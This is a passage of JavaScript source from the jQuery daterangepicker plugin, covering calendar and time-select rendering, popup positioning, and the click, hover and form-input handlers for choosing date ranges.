                var yearHtml = '<select class="yearselect">';
                for (var y = minYear; y <= maxYear; y++) {
                    yearHtml += '<option value="' + y + '"' +
                        (y === currentYear ? ' selected="selected"' : '') +
                        '>' + y + '</option>';
                }
                yearHtml += '</select>';

                dateHtml = monthHtml + yearHtml;
            }

            html += '<th colspan="5" class="month">' + dateHtml + '</th>';
            if ((!maxDate || maxDate.isAfter(calendar.lastDay)) && (!this.linkedCalendars || side == 'right' || this.singleDatePicker)) {
                html += '<th class="next available"><i class="fa fa-' + arrow.right + ' glyphicon glyphicon-' + arrow.right + '"></i></th>';
            } else {
                html += '<th></th>';
            }

            html += '</tr>';
            html += '<tr>';

            // add week number label
            if (this.showWeekNumbers || this.showISOWeekNumbers)
                html += '<th class="week">' + this.locale.weekLabel + '</th>';

            $.each(this.locale.daysOfWeek, function(index, dayOfWeek) {
                html += '<th>' + dayOfWeek + '</th>';
            });

            html += '</tr>';
            html += '</thead>';
            html += '<tbody>';

            //adjust maxDate to reflect the dateLimit setting in order to
            //grey out end dates beyond the dateLimit
            if (this.endDate == null && this.dateLimit) {
                var maxLimit = this.startDate.clone().add(this.dateLimit).endOf('day');
                if (!maxDate || maxLimit.isBefore(maxDate)) {
                    maxDate = maxLimit;
                }
            }

            for (var row = 0; row < 6; row++) {
                html += '<tr>';

                // add week number
                if (this.showWeekNumbers)
                    html += '<td class="week">' + calendar[row][0].week() + '</td>';
                else if (this.showISOWeekNumbers)
                    html += '<td class="week">' + calendar[row][0].isoWeek() + '</td>';

                for (var col = 0; col < 7; col++) {

                    var classes = [];

                    //highlight today's date
                    if (calendar[row][col].isSame(new Date(), "day"))
                        classes.push('today');

                    //highlight weekends
                    if (calendar[row][col].isoWeekday() > 5)
                        classes.push('weekend');

                    //grey out the dates in other months displayed at beginning and end of this calendar
                    if (calendar[row][col].month() != calendar[1][1].month())
                        classes.push('off');

                    //don't allow selection of dates before the minimum date
                    if (this.minDate && calendar[row][col].isBefore(this.minDate, 'day'))
                        classes.push('off', 'disabled');

                    //don't allow selection of dates after the maximum date
                    if (maxDate && calendar[row][col].isAfter(maxDate, 'day'))
                        classes.push('off', 'disabled');

                    //don't allow selection of date if a custom function decides it's invalid
                    if (this.isInvalidDate(calendar[row][col]))
                        classes.push('off', 'disabled');

                    //highlight the currently selected start date
                    if (calendar[row][col].format('YYYY-MM-DD') == this.startDate.format('YYYY-MM-DD'))
                        classes.push('active', 'start-date');

                    //highlight the currently selected end date
                    if (this.endDate != null && calendar[row][col].format('YYYY-MM-DD') == this.endDate.format('YYYY-MM-DD'))
                        classes.push('active', 'end-date');

                    //highlight dates in-between the selected dates
                    if (this.endDate != null && calendar[row][col] > this.startDate && calendar[row][col] < this.endDate)
                        classes.push('in-range');

                    //apply custom classes for this date
                    var isCustom = this.isCustomDate(calendar[row][col]);
                    if (isCustom !== false) {
                        if (typeof isCustom === 'string')
                            classes.push(isCustom);
                        else
                            Array.prototype.push.apply(classes, isCustom);
                    }

                    var cname = '', disabled = false;
                    for (var i = 0; i < classes.length; i++) {
                        cname += classes[i] + ' ';
                        if (classes[i] == 'disabled')
                            disabled = true;
                    }
                    if (!disabled)
                        cname += 'available';

                    html += '<td class="' + cname.replace(/^\s+|\s+$/g, '') + '" data-title="' + 'r' + row + 'c' + col + '">' + calendar[row][col].date() + '</td>';

                }
                html += '</tr>';
            }

            html += '</tbody>';
            html += '</table>';

            this.container.find('.calendar.' + side + ' .calendar-table').html(html);

        },

        renderTimePicker: function(side) {

            // Don't bother updating the time picker if it's currently disabled
            // because an end date hasn't been clicked yet
            if (side == 'right' && !this.endDate) return;

            var html, selected, minDate, maxDate = this.maxDate;

            if (this.dateLimit && (!this.maxDate || this.startDate.clone().add(this.dateLimit).isAfter(this.maxDate)))
                maxDate = this.startDate.clone().add(this.dateLimit);

            if (side == 'left') {
                selected = this.startDate.clone();
                minDate = this.minDate;
            } else if (side == 'right') {
                selected = this.endDate.clone();
                minDate = this.startDate;

                //Preserve the time already selected
                var timeSelector = this.container.find('.calendar.right .calendar-time div');
                if (timeSelector.html() != '') {

                    selected.hour(timeSelector.find('.hourselect option:selected').val() || selected.hour());
                    selected.minute(timeSelector.find('.minuteselect option:selected').val() || selected.minute());
                    selected.second(timeSelector.find('.secondselect option:selected').val() || selected.second());

                    if (!this.timePicker24Hour) {
                        var ampm = timeSelector.find('.ampmselect option:selected').val();
                        if (ampm === 'PM' && selected.hour() < 12)
                            selected.hour(selected.hour() + 12);
                        if (ampm === 'AM' && selected.hour() === 12)
                            selected.hour(0);
                    }

                }

                if (selected.isBefore(this.startDate))
                    selected = this.startDate.clone();

                if (maxDate && selected.isAfter(maxDate))
                    selected = maxDate.clone();

            }

            //
            // hours
            //

            html = '<select class="hourselect">';

            var start = this.timePicker24Hour ? 0 : 1;
            var end = this.timePicker24Hour ? 23 : 12;

            for (var i = start; i <= end; i++) {
                var i_in_24 = i;
                if (!this.timePicker24Hour)
                    i_in_24 = selected.hour() >= 12 ? (i == 12 ? 12 : i + 12) : (i == 12 ? 0 : i);

                var time = selected.clone().hour(i_in_24);
                var disabled = false;
                if (minDate && time.minute(59).isBefore(minDate))
                    disabled = true;
                if (maxDate && time.minute(0).isAfter(maxDate))
                    disabled = true;

                if (i_in_24 == selected.hour() && !disabled) {
                    html += '<option value="' + i + '" selected="selected">' + i + '</option>';
                } else if (disabled) {
                    html += '<option value="' + i + '" disabled="disabled" class="disabled">' + i + '</option>';
                } else {
                    html += '<option value="' + i + '">' + i + '</option>';
                }
            }

            html += '</select> ';

            //
            // minutes
            //

            html += ': <select class="minuteselect">';

            for (var i = 0; i < 60; i += this.timePickerIncrement) {
                var padded = i < 10 ? '0' + i : i;
                var time = selected.clone().minute(i);

                var disabled = false;
                if (minDate && time.second(59).isBefore(minDate))
                    disabled = true;
                if (maxDate && time.second(0).isAfter(maxDate))
                    disabled = true;

                if (selected.minute() == i && !disabled) {
                    html += '<option value="' + i + '" selected="selected">' + padded + '</option>';
                } else if (disabled) {
                    html += '<option value="' + i + '" disabled="disabled" class="disabled">' + padded + '</option>';
                } else {
                    html += '<option value="' + i + '">' + padded + '</option>';
                }
            }

            html += '</select> ';

            //
            // seconds
            //

            if (this.timePickerSeconds) {
                html += ': <select class="secondselect">';

                for (var i = 0; i < 60; i++) {
                    var padded = i < 10 ? '0' + i : i;
                    var time = selected.clone().second(i);

                    var disabled = false;
                    if (minDate && time.isBefore(minDate))
                        disabled = true;
                    if (maxDate && time.isAfter(maxDate))
                        disabled = true;

                    if (selected.second() == i && !disabled) {
                        html += '<option value="' + i + '" selected="selected">' + padded + '</option>';
                    } else if (disabled) {
                        html += '<option value="' + i + '" disabled="disabled" class="disabled">' + padded + '</option>';
                    } else {
                        html += '<option value="' + i + '">' + padded + '</option>';
                    }
                }

                html += '</select> ';
            }

            //
            // AM/PM
            //

            if (!this.timePicker24Hour) {
                html += '<select class="ampmselect">';

                var am_html = '';
                var pm_html = '';

                if (minDate && selected.clone().hour(12).minute(0).second(0).isBefore(minDate))
                    am_html = ' disabled="disabled" class="disabled"';

                if (maxDate && selected.clone().hour(0).minute(0).second(0).isAfter(maxDate))
                    pm_html = ' disabled="disabled" class="disabled"';

                if (selected.hour() >= 12) {
                    html += '<option value="AM"' + am_html + '>AM</option><option value="PM" selected="selected"' + pm_html + '>PM</option>';
                } else {
                    html += '<option value="AM" selected="selected"' + am_html + '>AM</option><option value="PM"' + pm_html + '>PM</option>';
                }

                html += '</select>';
            }

            this.container.find('.calendar.' + side + ' .calendar-time div').html(html);

        },

        updateFormInputs: function() {

            //ignore mouse movements while an above-calendar text input has focus
            if (this.container.find('input[name=daterangepicker_start]').is(":focus") || this.container.find('input[name=daterangepicker_end]').is(":focus"))
                return;

            this.container.find('input[name=daterangepicker_start]').val(this.startDate.format(this.locale.format));
            if (this.endDate)
                this.container.find('input[name=daterangepicker_end]').val(this.endDate.format(this.locale.format));

            if (this.singleDatePicker || (this.endDate && (this.startDate.isBefore(this.endDate) || this.startDate.isSame(this.endDate)))) {
                this.container.find('button.applyBtn').removeAttr('disabled');
            } else {
                this.container.find('button.applyBtn').attr('disabled', 'disabled');
            }

        },

        move: function() {
            var parentOffset = { top: 0, left: 0 },
                containerTop;
            var parentRightEdge = $(window).width();
            if (!this.parentEl.is('body')) {
                parentOffset = {
                    top: this.parentEl.offset().top - this.parentEl.scrollTop(),
                    left: this.parentEl.offset().left - this.parentEl.scrollLeft()
                };
                parentRightEdge = this.parentEl[0].clientWidth + this.parentEl.offset().left;
            }

            if (this.drops == 'up')
                containerTop = this.element.offset().top - this.container.outerHeight() - parentOffset.top;
            else
                containerTop = this.element.offset().top + this.element.outerHeight() - parentOffset.top;
            this.container[this.drops == 'up' ? 'addClass' : 'removeClass']('dropup');

            if (this.opens == 'left') {
                this.container.css({
                    top: containerTop,
                    right: parentRightEdge - this.element.offset().left - this.element.outerWidth(),
                    left: 'auto'
                });
                if (this.container.offset().left < 0) {
                    this.container.css({
                        right: 'auto',
                        left: 9
                    });
                }
            } else if (this.opens == 'center') {
                this.container.css({
                    top: containerTop,
                    left: this.element.offset().left - parentOffset.left + this.element.outerWidth() / 2
                            - this.container.outerWidth() / 2,
                    right: 'auto'
                });
                if (this.container.offset().left < 0) {
                    this.container.css({
                        right: 'auto',
                        left: 9
                    });
                }
            } else {
                this.container.css({
                    top: containerTop,
                    left: this.element.offset().left - parentOffset.left,
                    right: 'auto'
                });
                if (this.container.offset().left + this.container.outerWidth() > $(window).width()) {
                    this.container.css({
                        left: 'auto',
                        right: 0
                    });
                }
            }
        },

        show: function(e) {
            if (this.isShowing) return;

            // Create a click proxy that is private to this instance of datepicker, for unbinding
            this._outsideClickProxy = $.proxy(function(e) { this.outsideClick(e); }, this);

            // Bind global datepicker mousedown for hiding and
            $(document)
              .on('mousedown.daterangepicker', this._outsideClickProxy)
              // also support mobile devices
              .on('touchend.daterangepicker', this._outsideClickProxy)
              // also explicitly play nice with Bootstrap dropdowns, which stopPropagation when clicking them
              .on('click.daterangepicker', '[data-toggle=dropdown]', this._outsideClickProxy)
              // and also close when focus changes to outside the picker (eg. tabbing between controls)
              .on('focusin.daterangepicker', this._outsideClickProxy);

            // Reposition the picker if the window is resized while it's open
            $(window).on('resize.daterangepicker', $.proxy(function(e) { this.move(e); }, this));

            this.oldStartDate = this.startDate.clone();
            this.oldEndDate = this.endDate.clone();
            this.previousRightTime = this.endDate.clone();

            this.updateView();
            this.container.show();
            this.move();
            this.element.trigger('show.daterangepicker', this);
            this.isShowing = true;
        },

        hide: function(e) {
            if (!this.isShowing) return;

            //incomplete date selection, revert to last values
            if (!this.endDate) {
                this.startDate = this.oldStartDate.clone();
                this.endDate = this.oldEndDate.clone();
            }

            //if a new date range was selected, invoke the user callback function
            if (!this.startDate.isSame(this.oldStartDate) || !this.endDate.isSame(this.oldEndDate))
                this.callback(this.startDate, this.endDate, this.chosenLabel);

            //if picker is attached to a text input, update it
            this.updateElement();

            $(document).off('.daterangepicker');
            $(window).off('.daterangepicker');
            this.container.hide();
            this.element.trigger('hide.daterangepicker', this);
            this.isShowing = false;
        },

        toggle: function(e) {
            if (this.isShowing) {
                this.hide();
            } else {
                this.show();
            }
        },

        outsideClick: function(e) {
            var target = $(e.target);
            // if the page is clicked anywhere except within the daterangerpicker/button
            // itself then call this.hide()
            if (
                // ie modal dialog fix
                e.type == "focusin" ||
                target.closest(this.element).length ||
                target.closest(this.container).length ||
                target.closest('.calendar-table').length
                ) return;
            this.hide();
            this.element.trigger('outsideClick.daterangepicker', this);
        },

        showCalendars: function() {
            this.container.addClass('show-calendar');
            this.move();
            this.element.trigger('showCalendar.daterangepicker', this);
        },

        hideCalendars: function() {
            this.container.removeClass('show-calendar');
            this.element.trigger('hideCalendar.daterangepicker', this);
        },

        hoverRange: function(e) {

            //ignore mouse movements while an above-calendar text input has focus
            if (this.container.find('input[name=daterangepicker_start]').is(":focus") || this.container.find('input[name=daterangepicker_end]').is(":focus"))
                return;

            var label = e.target.getAttribute('data-range-key');

            if (label == this.locale.customRangeLabel) {
                this.updateView();
            } else {
                var dates = this.ranges[label];
                this.container.find('input[name=daterangepicker_start]').val(dates[0].format(this.locale.format));
                this.container.find('input[name=daterangepicker_end]').val(dates[1].format(this.locale.format));
            }

        },

        clickRange: function(e) {
            var label = e.target.getAttribute('data-range-key');
            this.chosenLabel = label;
            if (label == this.locale.customRangeLabel) {
                this.showCalendars();
            } else {
                var dates = this.ranges[label];
                this.startDate = dates[0];
                this.endDate = dates[1];

                if (!this.timePicker) {
                    this.startDate.startOf('day');
                    this.endDate.endOf('day');
                }

                if (!this.alwaysShowCalendars)
                    this.hideCalendars();
                this.clickApply();
            }
        },

        clickPrev: function(e) {
            var cal = $(e.target).parents('.calendar');
            if (cal.hasClass('left')) {
                this.leftCalendar.month.subtract(1, 'month');
                if (this.linkedCalendars)
                    this.rightCalendar.month.subtract(1, 'month');
            } else {
                this.rightCalendar.month.subtract(1, 'month');
            }
            this.updateCalendars();
        },

        clickNext: function(e) {
            var cal = $(e.target).parents('.calendar');
            if (cal.hasClass('left')) {
                this.leftCalendar.month.add(1, 'month');
            } else {
                this.rightCalendar.month.add(1, 'month');
                if (this.linkedCalendars)
                    this.leftCalendar.month.add(1, 'month');
            }
            this.updateCalendars();
        },

        hoverDate: function(e) {

            //ignore mouse movements while an above-calendar text input has focus
            //if (this.container.find('input[name=daterangepicker_start]').is(":focus") || this.container.find('input[name=daterangepicker_end]').is(":focus"))
            //    return;

            //ignore dates that can't be selected
            if (!$(e.target).hasClass('available')) return;

            //have the text inputs above calendars reflect the date being hovered over
            var title = $(e.target).attr('data-title');
            var row = title.substr(1, 1);
            var col = title.substr(3, 1);
            var cal = $(e.target).parents('.calendar');
            var date = cal.hasClass('left') ? this.leftCalendar.calendar[row][col] : this.rightCalendar.calendar[row][col];

            if (this.endDate && !this.container.find('input[name=daterangepicker_start]').is(":focus")) {
                this.container.find('input[name=daterangepicker_start]').val(date.format(this.locale.format));
            } else if (!this.endDate && !this.container.find('input[name=daterangepicker_end]').is(":focus")) {
                this.container.find('input[name=daterangepicker_end]').val(date.format(this.locale.format));
            }

            //highlight the dates between the start date and the date being hovered as a potential end date
            var leftCalendar = this.leftCalendar;
            var rightCalendar = this.rightCalendar;
            var startDate = this.startDate;
            if (!this.endDate) {
                this.container.find('.calendar tbody td').each(function(index, el) {

                    //skip week numbers, only look at dates
                    if ($(el).hasClass('week')) return;

                    var title = $(el).attr('data-title');
                    var row = title.substr(1, 1);
                    var col = title.substr(3, 1);
                    var cal = $(el).parents('.calendar');
                    var dt = cal.hasClass('left') ? leftCalendar.calendar[row][col] : rightCalendar.calendar[row][col];

                    if ((dt.isAfter(startDate) && dt.isBefore(date)) || dt.isSame(date, 'day')) {
                        $(el).addClass('in-range');
                    } else {
                        $(el).removeClass('in-range');
                    }

                });
            }

        },

        clickDate: function(e) {

            if (!$(e.target).hasClass('available')) return;

            var title = $(e.target).attr('data-title');
            var row = title.substr(1, 1);
            var col = title.substr(3, 1);
            var cal = $(e.target).parents('.calendar');
            var date = cal.hasClass('left') ? this.leftCalendar.calendar[row][col] : this.rightCalendar.calendar[row][col];

            //
            // this function needs to do a few things:
            // * alternate between selecting a start and end date for the range,
            // * if the time picker is enabled, apply the hour/minute/second from the select boxes to the clicked date
            // * if autoapply is enabled, and an end date was chosen, apply the selection
            // * if single date picker mode, and time picker isn't enabled, apply the selection immediately
            // * if one of the inputs above the calendars was focused, cancel that manual input
            //

            if (this.endDate || date.isBefore(this.startDate, 'day')) { //picking start
                if (this.timePicker) {
                    var hour = parseInt(this.container.find('.left .hourselect').val(), 10);
                    if (!this.timePicker24Hour) {
                        var ampm = this.container.find('.left .ampmselect').val();
                        if (ampm === 'PM' && hour < 12)
                            hour += 12;
                        if (ampm === 'AM' && hour === 12)
                            hour = 0;
                    }
                    var minute = parseInt(this.container.find('.left .minuteselect').val(), 10);
                    var second = this.timePickerSeconds ? parseInt(this.container.find('.left .secondselect').val(), 10) : 0;
                    date = date.clone().hour(hour).minute(minute).second(second);
                }
                this.endDate = null;
                this.setStartDate(date.clone());
            } else if (!this.endDate && date.isBefore(this.startDate)) {
                //special case: clicking the same date for start/end,
                //but the time of the end date is before the start date
                this.setEndDate(this.startDate.clone());
            } else { // picking end
                if (this.timePicker) {
                    var hour = parseInt(this.container.find('.right .hourselect').val(), 10);
                    if (!this.timePicker24Hour) {
                        var ampm = this.container.find('.right .ampmselect').val();
                        if (ampm === 'PM' && hour < 12)
                            hour += 12;
                        if (ampm === 'AM' && hour === 12)
                            hour = 0;
                    }
                    var minute = parseInt(this.container.find('.right .minuteselect').val(), 10);
                    var second = this.timePickerSeconds ? parseInt(this.container.find('.right .secondselect').val(), 10) : 0;
                    date = date.clone().hour(hour).minute(minute).second(second);
                }
                this.setEndDate(date.clone());
                if (this.autoApply) {
                  this.calculateChosenLabel();
                  this.clickApply();
                }
            }

            if (this.singleDatePicker) {
                this.setEndDate(this.startDate);
                if (!this.timePicker)
                    this.clickApply();
            }

            this.updateView();

            //This is to cancel the blur event handler if the mouse was in one of the inputs
            e.stopPropagation();

        },

        calculateChosenLabel: function () {
            var customRange = true;
            var i = 0;
            for (var range in this.ranges) {
                if (this.timePicker) {
                    if (this.startDate.isSame(this.ranges[range][0]) && this.endDate.isSame(this.ranges[range][1])) {
                        customRange = false;
                        this.chosenLabel = this.container.find('.ranges li:eq(' + i + ')').addClass('active').html();
                        break;
                    }
                } else {
                    //ignore times when comparing dates if time picker is not enabled
                    if (this.startDate.format('YYYY-MM-DD') == this.ranges[range][0].format('YYYY-MM-DD') && this.endDate.format('YYYY-MM-DD') == this.ranges[range][1].format('YYYY-MM-DD')) {
                        customRange = false;
                        this.chosenLabel = this.container.find('.ranges li:eq(' + i + ')').addClass('active').html();
                        break;
                    }
                }
                i++;
            }
            if (customRange) {
                if (this.showCustomRangeLabel) {
                    this.chosenLabel = this.container.find('.ranges li:last').addClass('active').html();
                } else {
                    this.chosenLabel = null;
                }
                this.showCalendars();
            }
        },

        clickApply: function(e) {
            this.hide();
            this.element.trigger('apply.daterangepicker', this);
        },

        clickCancel: function(e) {
            this.startDate = this.oldStartDate;
            this.endDate = this.oldEndDate;
            this.hide();
            this.element.trigger('cancel.daterangepicker', this);
        },

        monthOrYearChanged: function(e) {
            var isLeft = $(e.target).closest('.calendar').hasClass('left'),
                leftOrRight = isLeft ? 'left' : 'right',
                cal = this.container.find('.calendar.'+leftOrRight);

            // Month must be Number for new moment versions
            var month = parseInt(cal.find('.monthselect').val(), 10);
            var year = cal.find('.yearselect').val();

            if (!isLeft) {
                if (year < this.startDate.year() || (year == this.startDate.year() && month < this.startDate.month())) {
                    month = this.startDate.month();
                    year = this.startDate.year();
                }
            }

            if (this.minDate) {
                if (year < this.minDate.year() || (year == this.minDate.year() && month < this.minDate.month())) {
                    month = this.minDate.month();
                    year = this.minDate.year();
                }
            }

            if (this.maxDate) {
                if (year > this.maxDate.year() || (year == this.maxDate.year() && month > this.maxDate.month())) {
                    month = this.maxDate.month();
                    year = this.maxDate.year();
                }
            }

            if (isLeft) {
                this.leftCalendar.month.month(month).year(year);
                if (this.linkedCalendars)
                    this.rightCalendar.month = this.leftCalendar.month.clone().add(1, 'month');
            } else {
                this.rightCalendar.month.month(month).year(year);
                if (this.linkedCalendars)
                    this.leftCalendar.month = this.rightCalendar.month.clone().subtract(1, 'month');
            }
            this.updateCalendars();
        },

        timeChanged: function(e) {

            var cal = $(e.target).closest('.calendar'),
                isLeft = cal.hasClass('left');

            var hour = parseInt(cal.find('.hourselect').val(), 10);
            var minute = parseInt(cal.find('.minuteselect').val(), 10);
            var second = this.timePickerSeconds ? parseInt(cal.find('.secondselect').val(), 10) : 0;

            if (!this.timePicker24Hour) {
                var ampm = cal.find('.ampmselect').val();
                if (ampm === 'PM' && hour < 12)
                    hour += 12;
                if (ampm === 'AM' && hour === 12)
                    hour = 0;
            }

            if (isLeft) {
                var start = this.startDate.clone();
                start.hour(hour);
                start.minute(minute);
                start.second(second);
                this.setStartDate(start);
                if (this.singleDatePicker) {
                    this.endDate = this.startDate.clone();
                } else if (this.endDate && this.endDate.format('YYYY-MM-DD') == start.format('YYYY-MM-DD') && this.endDate.isBefore(start)) {
                    this.setEndDate(start.clone());
                }
            } else if (this.endDate) {
                var end = this.endDate.clone();
                end.hour(hour);
                end.minute(minute);
                end.second(second);
                this.setEndDate(end);
            }

            //update the calendars so all clickable dates reflect the new time component
            this.updateCalendars();

            //update the form inputs above the calendars with the new time
            this.updateFormInputs();

            //re-render the time pickers because changing one selection can affect what's enabled in another
            this.renderTimePicker('left');
            this.renderTimePicker('right');

        },

        formInputsChanged: function(e) {
            var isRight = $(e.target).closest('.calendar').hasClass('right');
            var start = moment(this.container.find('input[name="daterangepicker_start"]').val(), this.locale.format);
            var end = moment(this.container.find('input[name="daterangepicker_end"]').val(), this.locale.format);

            if (start.isValid() && end.isValid()) {

                if (isRight && end.isBefore(start))
                    start = end.clone();

                this.setStartDate(start);
                this.setEndDate(end);

                if (isRight) {
                    this.container.find('input[name="daterangepicker_start"]').val(this.startDate.format(this.locale.format));
                } else {
                    this.container.find('input[name="daterangepicker_end"]').val(this.endDate.format(this.locale.format));
                }

            }

            this.updateView();
        },

        formInputsFocused: function(e) {

            // Highlight the focused input
            this.container.find('input[name="daterangepicker_start"], input[name="daterangepicker_end"]').removeClass('active');
            $(e.target).addClass('active');

            // Set the state such that if the user goes back to using a mouse, 
            // the calendars are aware we're selecting the end of the range, not
            // the start. This allows someone to edit the end of a date range without
            // re-selecting the beginning, by clicking on the end date input then
            // using the calendar.
            var isRight = $(e.target).closest('.calendar').hasClass('right');
            if (isRight) {
                this.endDate = null;
                this.setStartDate(this.startDate.clone());
                this.updateView();
            }

        },

        formInputsBlurred: function(e) {

            // this function has one purpose right now: if you tab from the first
            // text input to the second in the UI, the endDate is nulled so that
            // you can click another, but if you tab out without clicking anything
            // or changing the input value, the old endDate should be retained

            if (!this.endDate) {
                var val = this.container.find('input[name="daterangepicker_end"]').val();
                var end = moment(val, this.locale.format);
                if (end.isValid()) {
                    this.setEndDate(end);
                    this.updateView();
                }
            }

        },

        elementChanged: function() {
            if (!this.element.is('input')) return;
            if (!this.element.val().length) return;
            if (this.element.val().length < this.locale.format.length) return;

            var dateString = this.element.val().split(this.locale.separator),
                start = null,
                end = null;

            if (dateString.length === 2) {
                start = moment(dateString[0], this.locale.format);
                end = moment(dateString[1], this.locale.format);
            }

            if (this.singleDatePicker || start === null || end === null) {
                start = moment(this.element.val(), this.locale.format);
                end = start;
            }

            if (!start.isValid() || !end.isValid()) return;

            this.setStartDate(start);
            this.setEndDate(end);
            this.updateView();
        },

        keydown: function(e) {
            //hide on tab or enter
            if ((e.keyCode === 9) || (e.keyCode === 13)) {
                this.hide();
            }
        },

        updateElement: function() {
            if (this.element.is('input') && !this.singleDatePicker && this.autoUpdateInput) {
                this.element.val(this.startDate.format(this.locale.format) + this.locale.separator + this.endDate.format(this.locale.format));
                this.element.trigger('change');
            } else if (this.element.is('input') && this.autoUpdateInput) {
                this.element.val(this.startDate.format(this.locale.format));
                this.element.trigger('change');
            }
        },

        remove: function() {
            this.container.remove();
            this.element.off('.daterangepicker');
            this.element.removeData();
        }

    };

    $.fn.daterangepicker = function(options, callback) {
        this.each(function() {
            var el = $(this);
            if (el.data('daterangepicker'))
                el.data('daterangepicker').remove();
            el.data('daterangepicker', new DateRangePicker(el, options, callback));
        });
        return this;
    };

    return DateRangePicker;

}));
